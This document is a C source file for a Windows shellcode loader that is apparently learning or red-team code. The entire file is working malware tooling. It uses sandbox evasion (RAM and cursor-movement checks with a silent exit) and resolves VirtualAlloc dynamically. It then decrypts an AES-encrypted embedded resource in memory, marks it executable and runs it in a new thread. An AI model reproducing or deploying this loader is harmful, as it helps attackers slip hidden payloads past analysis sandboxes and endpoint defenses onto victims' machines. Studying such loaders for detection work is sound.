#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>   // For CreateToolhelp32Snapshot, Process32First/Next
#include "resource.h"
#include "aes.h"

BOOL is_sandbox() {
    // Check 1: RAM < 4GB = likely a sandbox/VM
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status); // Fill mem_status with info 
    DWORD ram_gb = (DWORD)(mem_status.ullTotalPhys / (1024 * 1024 * 1024));
    if (ram_gb < 4) {
        return TRUE;
    }

    // Check 2: cursor doesn't move = likely automated/sandbox
    POINT pos1, pos2;
    GetCursorPos(&pos1);
    Sleep(1000);
    GetCursorPos(&pos2);
    if (pos1.x == pos2.x && pos1.y == pos2.y) {
        return TRUE;
    }

    return FALSE;
}

int main () {
    // --- Sandbox evasion ---
    if (is_sandbox()) {
        return 0; // Exit silently
    }

    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD); // Define type of Virtual Alloc
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll"); // Call kernel32.dll
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(hKernel32, "VirtualAlloc"); // Get the address of VirtualAlloc

    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA); // Find the resource
    if (res == NULL) {
        printf("[!] Find resource failed !\n");
        return 1;
    }
    printf("[+] Find resource success !\n");

    HGLOBAL res_data = LoadResource(NULL, res); // Load the resource
    if (res_data == NULL) {
        printf("[!] Load resource failed !\n");
        return 1;
    }
    printf("[+] Load resource success !\n");

    LPVOID payload = LockResource(res_data); // Lock the resource
    if (payload == NULL){
        printf("[!] Lock resource failed !\n");
        return 1;
    }
    printf("[+] Lock resource success !\n");

    DWORD payload_size = SizeofResource(NULL, res); // Get the size of the resource
    printf("[+] Payload size: %d bytes\n", payload_size);

    // Verify payload size is multiple of 16 (AES block size)
    if (payload_size % 16 != 0) {
        printf("[!] WARNING: Payload size is NOT a multiple of 16! AES-CBC will fail.\n");
    }

    exec_mem = pVirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Return memory address that reserve in RAM
    if (exec_mem == NULL) {
        printf("[!] VirtualAlloc failed !\n");
        return 1;
    }
    printf("[+] VirtualAlloc success !\n");

    RtlMoveMemory(exec_mem, payload, payload_size); // Copy encrypted payload to memory
    printf("[+] Encrypted payload copied to memory !\n");

    // AES-256-CBC decrypt the payload in memory
    printf("[*] Starting AES-256-CBC decryption...\n");
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t *)exec_mem, payload_size);
    printf("[+] Payload decrypted in memory (AES-256-CBC) !\n");

    rv = VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &oldprotect); // Re-purpose mem address to execute
    if (!rv) {
        printf("[!] VirtualProtect failed !\n");
        return 1;
    }
    printf("[+] VirtualProtect success !\n");

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0); // Create a thread to execute the payload
    if (th == NULL) {
        printf("[!] CreateThread failed !\n");
        return 1;
    }
    printf("[+] CreateThread success !\n");

    WaitForSingleObject(th, -1); // Wait for the thread to finish

    return 0;
}